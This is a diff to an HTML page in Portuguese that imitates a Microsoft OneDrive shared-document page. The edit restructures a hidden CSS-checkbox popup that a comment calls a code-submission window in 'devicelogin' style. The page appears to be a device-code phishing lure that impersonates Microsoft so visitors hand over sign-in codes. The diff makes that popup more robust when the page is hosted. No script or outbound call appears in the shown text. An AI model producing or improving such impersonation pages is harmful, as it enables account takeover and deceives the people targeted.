@@ -74,10 +74,6 @@
 </head>
 <body>
 
-  <!-- Gatilhos do popup (escondidos). Irmãos do .modal-overlay para o seletor ~ -->
-  <input type="checkbox" id="openModal" aria-hidden="true" tabindex="-1">
-  <input type="checkbox" id="closeModal" aria-hidden="true" tabindex="-1">
-
   <div class="bar"><span class="ms"><i class="r"></i><i class="g"></i><i class="b"></i><i class="y"></i></span> Documento partilhado no OneDrive</div>
 
   <div class="wrap">
@@ -112,7 +108,11 @@
 
   <footer>© 2026 Microsoft Corporation. Todos os direitos reservados.</footer>
 
-  <!-- Popup/modal: janela de submissão do código (estilo devicelogin) -->
+  <!-- Popup/modal: checkbox + overlay no MESMO contentor, para continuarem
+       "irmãos" (seletor ~) mesmo que a plataforma embrulhe o corpo da página. -->
+  <div class="modal-root">
+  <input type="checkbox" id="openModal" aria-hidden="true" tabindex="-1">
+  <input type="checkbox" id="closeModal" aria-hidden="true" tabindex="-1">
   <div class="modal-overlay">
     <div class="modal-card">
       <label for="closeModal" class="modal-close" aria-label="Fechar">✕</label>
@@ -127,6 +127,7 @@
       </div>
     </div>
   </div>
+  </div><!-- /.modal-root -->
 
 </body>
 </html>
